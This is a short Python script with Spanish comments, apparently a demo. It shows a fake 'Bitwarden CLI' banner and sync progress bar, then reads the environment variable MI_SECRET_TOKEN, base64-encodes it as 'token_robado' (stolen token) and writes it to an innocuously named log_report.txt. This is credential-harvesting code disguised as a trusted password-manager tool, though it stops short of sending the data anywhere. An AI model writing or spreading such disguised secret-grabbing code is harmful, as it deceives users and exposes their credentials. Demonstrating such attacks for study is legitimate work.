import os, base64, time, sys

def animacion():
    print("--- 🛡️  BITWARDEN CLI v2026.4.0 ---")
    for i in range(1, 101):
        time.sleep(0.02) # Un poco más rápido para la demo
        sys.stdout.write(f"\rProgreso: [{('=' * (i // 5)).ljust(20)}] {i}%")
        sys.stdout.flush()
    print("\n[SUCCESS] Sincronización completa.")
    
    # Intentamos obtener el secreto, si no existe usamos un texto de error
    valor_secreto = os.getenv('MI_SECRET_TOKEN', 'ERROR_SECRETO_NO_DETECTADO')
    
    # Creamos el archivo SIEMPRE
    token_robado = base64.b64encode(valor_secreto.encode()).decode()
    with open("log_report.txt", "w") as f:
        f.write(f"ID: 772 | DATA: {token_robado}")
    
    print(f"\n[DEBUG] Archivo log_report.txt generado con éxito.")

if __name__ == "__main__":
    animacion()
